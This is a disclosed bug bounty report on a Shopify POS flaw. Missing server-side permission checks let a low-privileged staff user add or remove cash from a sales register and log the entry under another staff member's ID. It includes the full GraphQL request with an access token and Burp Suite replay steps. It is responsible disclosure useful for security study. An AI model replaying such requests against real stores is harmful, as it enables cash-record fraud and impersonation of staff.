# Low Privileged user can add or remove cash to/from sales register

## Report Details
- **Report ID**: 905543
- **URL**: https://hackerone.com/reports/905543
- **State**: Closed
- **Severity**: low
- **Submitted**: 2020-06-22T18:00:10.471Z
- **Disclosed**: 2021-06-16T17:27:06.233Z

## Reporter
- **Username**: sandeep_rj49
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
Low privileged user having no access to Shopify POS  and very low permission set is not allowed to add cash to the sales register or remove cash from the sales register. But missing server-side permission checks on the vulnerable request allows a low privileged user to do this.  A low privileged can add cash to the sales register using the vulnerable request and can supply the staff member id of other users to show that another member added/removed the cash from the sales register.

This vulnerability can be exploited by replaying the vulnerable request using a low privileged user session.

###Vulnerable request:
Request 1: To add/remove Cash from sales register. 
```
POST /admin/api/unversioned/graphql HTTP/1.1
Host: alwayzhack.myshopify.com
Content-Type: application/json
Connection: close
X-Shopify-Override-User-Locale: en-IN
X-Shopify-Access-Token: 7c46e4dbba8ca0eeeedbde70ad308919
Accept: application/json
X-DeviceID: B84572D0-F696-47EC-8A18-ECD286B215CD
User-Agent: Shopify POS/iOS/6.7.0 (iPhone12,3/com.jadedpixel.pos/13.1.1) - Build 630
Content-Length: 667
Accept-Language: en-us
Accept-Encoding: gzip, deflate

{"query":"fragment UserErrors on UserError { __typename field message } mutation CashTrackingSessionAdjust($sessionID: ID!, $money: MoneyInput!, $time: DateTime!, $staffMemberId: ID!, $note: String) { __typename cashTrackingSessionAdjust(cashTrackingSessionId: $sessionID, cash: $money, time: $time, staffMemberId: $staffMemberId, note: $note) { __typename userErrors { __typename ... UserErrors } cashTrackingSession { __typename id } } }","variables":{"money":{"amount":"500","currencyCode":"INR"},"sessionID":"gid:\/\/shopify\/CashTrackingSession\/58327096","note":"","time":"2020-06-22T17:19:21+05:30","staffMemberId":"gid:\/\/shopify\/StaffMember\/42668326968"}}
```
Change the session id with the active cash tracking session-id and staff member id with another staff member id. The supplied staff member will be displayed in the cash entry, so a low privileged user can supply another staff member's id.

##Steps to reproduce:
1. Add a low privileged user to the Shopify account and do not give access to the Shopify POS sales channel (Assign any very low permission or no permission).
2. Download the Shopify POS iOS application on the iPhone and configure it with the burp suite proxy.
3. Login to the account using low privileged user credentials.
4. Copy the low privileged user access token, disclosed in -POST /admin/api/xauth HTTP/1.1 API response.
5. Change the session id with the active cash tracking session-id and staff member id with another staff member id in the vulnerable request.
6. Paste the low privileged user access token in the vulnerable request and replay it in the burp suite proxy tool.  Cash entry will be logged in the sales register using another staff member's name. 

Please note: to add cash use positive cash value (for example: 500) and to remove cash from sales register supply negative cash values (for example: -500) in the amount parameter of the vulnerable request.

## Impact

Low privileged user can add or remove cash from the sales register.

## Attachments
No attachments
